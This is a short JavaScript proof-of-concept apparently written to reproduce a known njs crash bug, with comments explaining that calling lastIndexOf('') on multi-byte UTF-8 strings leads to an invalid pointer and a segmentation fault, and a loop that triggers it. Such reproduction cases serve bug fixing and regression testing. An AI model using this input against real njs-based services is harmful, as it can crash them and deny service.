// PoC for njs.cve-2022-38890 - SEGV in njs_utf8_next
// This triggers a segmentation fault in njs_string_prototype_last_index_of
// when calling lastIndexOf on a UTF-8 string with specific parameters

// Based on the analysis, the vulnerability occurs when:
// - A UTF-8 string (where string.size != string.length) is used
// - lastIndexOf is called with an empty search string
// - The index calculation results in calling njs_string_offset with index = length
// - This causes njs_string_offset to return an invalid pointer
// - Which then causes SEGV in njs_utf8_next

// Test case 1: UTF-8 strings with lastIndexOf("")
console.log("Test 1: UTF-8 strings with lastIndexOf('')");
var utf8Strings = [
    "世界",                    // 2 chars, 6 bytes
    "Hello 世界",              // 8 chars, 11 bytes
    "🌍🌎🌏",                   // 3 chars, 12 bytes
    "a\u0300b\u0301c",        // 5 chars, 7 bytes (combining chars)
];

for (var i = 0; i < utf8Strings.length; i++) {
    var str = utf8Strings[i];
    console.log("String:", str, "Length:", str.length);
    try {
        var result = str.lastIndexOf("");
        console.log("  lastIndexOf(''):", result);
    } catch (e) {
        console.log("  ERROR:", e);
    }
}

